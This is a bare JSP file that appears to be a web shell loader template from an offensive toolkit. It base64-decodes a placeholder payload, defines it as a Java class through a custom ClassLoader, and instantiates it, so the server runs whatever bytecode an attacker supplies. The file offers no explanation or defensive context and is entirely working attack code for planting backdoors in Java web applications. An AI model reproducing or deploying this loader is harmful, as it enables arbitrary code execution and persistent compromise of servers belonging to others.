<%!
    public static class ClassDefiner extends ClassLoader {
        public ClassDefiner(ClassLoader classLoader) {
            super(classLoader);
        }

        public Class defineClass(byte[] code) {
            return defineClass(null, code, 0, code.length);
        }
    }
%>

<%
    String base64Str = "{{base64Str}}";
    byte[] bytecode = null;
    try {
        Class base64Clz = Class.forName("java.util.Base64");
        Object decoder = base64Clz.getMethod("getDecoder", new Class[0]).invoke(null, new Object[0]);
        bytecode = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{base64Str});
    } catch (ClassNotFoundException ee) {
        Class datatypeConverterClz = Class.forName("javax.xml.bind.DatatypeConverter");
        bytecode = (byte[]) datatypeConverterClz.getMethod("parseBase64Binary", new Class[]{String.class}).invoke(null, new Object[]{base64Str});
    }
    Class clazz = new ClassDefiner(Thread.currentThread().getContextClassLoader()).defineClass(bytecode);
    clazz.newInstance();
%>
